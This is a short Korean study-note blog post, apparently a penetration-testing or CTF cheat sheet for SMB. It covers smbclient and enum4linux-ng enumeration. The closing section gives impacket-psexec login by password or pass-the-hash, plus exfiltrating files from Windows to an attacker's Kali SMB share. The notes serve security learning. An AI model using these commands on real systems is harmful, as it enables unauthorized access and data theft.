---
slug: "smb-checklist"
title: "smb_checklist"
date: 2026-07-15
category: "미분류"
tags: []
excerpt: "Windows 네트워크에서 쓰는 **공유 자원 접근 프로토콜**(파일/ 프린터/ 공유자원 접근) -p : 445 ``` \\\\192.168.0.10\\share\\"
readingTime: 2
---

# SMB란?
Windows 네트워크에서 쓰는 **공유 자원 접근 프로토콜**(파일/ 프린터/ 공유자원 접근)
-p : 445
```
\\192.168.0.10\share\

\\SERVER\공유폴더
```

```
SMB = 윈도우/리눅스 서버의 공유폴더를 열어보는 통로

파일 공유 + 네트워크 자원 공유 + 인증/권한 기반 접근
```
 
 보통 enum4linux-ng -> smbclient 순으로
 
 ---
### smbclient
-> smb에 직접 접속하는 도구
```bash
# 공유 목록 확인 (익명)
smbclient -L //{IP} -N

# 공유 접속
smbclient //{IP}/{share} -N

# 크레덴셜 있을 때
smbclient -L //{IP} -U {user}
smbclient //{IP}/{share} -U {user}

# 접속 후 자주 쓰는 명령어
ls          # 파일 목록
get {파일}  # 파일 다운로드
put {파일}  # 파일 업로드
cd {폴더}   # 디렉터리 이동
```

---
### **enum4linux-ng**
-> SMB/RPC로 서버에서 정보 긁어오는 도구(user, group, share, pw policy 등등)
```bash
# 기본 전체 열거
enum4linux-ng -A {IP}

# 결과에서 볼 것
- 도메인명
- 유저 목록
- 그룹 목록
- 공유 목록
- 패스워드 정책
```
---
### **SSH 없을 때 SMB로 인증/파일반출 대체**

```sh
# 크리덴셜(비번 or NTLM 해시) 확보 후 445만 열려있으면

# 비밀번호로
impacket-psexec administrator:'<password>'@10.129.228.112
# 해시로 (pass-the-hash)
impacket-psexec administrator@10.129.228.112 -hashes :<NTLM_HASH>
  
# 파일 반출 (윈도우 → 칼리)
#칼리에서
impacket-smbserver Share $(pwd) -smb2support

#윈도우에서
copy <file> \\<kali_IP>\Share\
```